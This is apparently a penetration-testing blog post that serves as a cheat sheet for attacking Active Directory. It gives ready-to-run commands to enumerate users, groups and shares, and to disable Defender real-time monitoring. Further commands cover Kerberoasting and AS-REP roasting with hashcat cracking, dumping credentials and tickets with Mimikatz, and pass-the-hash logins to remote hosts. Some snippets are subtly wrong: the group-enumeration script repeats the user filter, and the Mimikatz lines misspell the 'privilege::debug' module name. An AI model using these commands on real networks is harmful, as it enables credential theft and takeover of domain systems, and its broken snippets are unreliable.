---
title: Active Directory Attacks
author: h40huynh
date: 2022-08-23 11:33:00 +0700
categories: [Network Pentest, Post Exploitaion]
tags: [AD]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/network_pentest/ad.png
---

## Manually Enumeration

### Basic enumeration

#### Use built-in net.exe application

Who are you

```powershell
net user
```

Enumerate all users

```powershell
net user /domain
```

Enumerate all groups

```powershell
net group /domain
```

#### Use powershell script

Enumerate all users

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "------------------------"
}
```

Enumerate all groups

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "------------------------"
}
```

### Service account enumeration (Though SPNs)

When SQL, IIS or other services are integrated into Active Directory, Service Principal Name (SPN) will associate these service to a service account in Active Directory.
By enumerating all registered SPNs in the domain, we can obtain infomation about applications running on servers integrated with the the Active Directory.

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```

## PowerView

Load powershell module

```powershell
Import .\PowerView.ps1
```

For disable virus protection

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Domain

```powershell
Get-Domain
```

### Domain Policy

```powershell
Get-DomainPolicy
```

### Domain Controller

```powershell
Get-DomainController
```

### Domain Users

**List all users**

```powershell
Get-DomainUser
Get-DomainUser -SPN # Enumerate account service
```

**Detail of a specific user**

```powershell
Get-DomainUser -Identity <username>
```

**User logged on a machine**

```powershell
Get-NetLoggedon -ComputerName <computer-name>
```

**List of computers in the current domain**

```powershell
Get-NetComputer| select name, operatingsystem
```

### Groups

**List all groups in the current domain**

```powershell
Get-NetGroup
```

**Detail a specific group**

```powershell
Get-NetGroup 'Domain Admins'
```

**List all groups in local**

```powershell
Get-NetLocalGroup | Select-Object GroupName
```

**List members of the domain admin group**

```powershell
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
```

### Shares

**Find share on hosts**

```powershell
Invoke-ShareFinder  -Verbose
```

**List network shares**

```powershell
Get-NetShare
```

**Find all domain shares**

```powershell
Find-DomainShare
Find-DomainShare -CheckShareAccess # Find shares with read access
```

**Obtains the file server used by the current domain according to the SPN**

```powershell
Get-NetFileServer -Verbose
```

### Group Policies

```powershell
Get-NetGPO
```

## Service account attacks

### Kerberoasting attack

The service ticket is encrypted through the password hash of the SPN. So, We can request a service ticket from DC, extract and attemp to crack the password of the service account.

**Find all users with an SPN set (likely service accounts)**

```powershell
Get-DomainUser -SPN
```

The **Invoke-Kerberoast.ps1** script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.

```powershell
Import-Module C:\Windows\Temp\Invoke-Kerberoast.ps1
```

```powershell
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

```powershell
hashcat -m 13100 --force -a 0 hashes.kerberoast rockyou
```

### ASREPRoasting

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

If don't have any domain username, let's enumerate

```bash
./kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

Then, use `GetNPUsers` to request ticket

```bash
impacket-GetNPUsers domain.local/svc-admin -no-pass
```

Then, crack the hash

```bash
hashcat -m 18200 -a 0 hash.kerberos passwordlist.txt
```

## Lateral movement

### Mimikatz - Cached Credential

Dump the credentials of all logged-on users:

```powershell
mimikatz.exe "priviledge::debug" "sekurlsa::logonpasswords" exit
```

Dump Kerberos TGT and service tickets:

```powershell
mimikatz.exe "priviledge::debug" "sekurlsa::tickets" exit
```

### Pass the hash

Allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password

```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@10.0.0.4
```

```powershell
mimikatz.exe "priviledge::debug" "sekurlsa::pth /user:jeff /domain:doamin /ntlm:d4ad8b9f8ccb87f6d02d7388157ae" exit
```
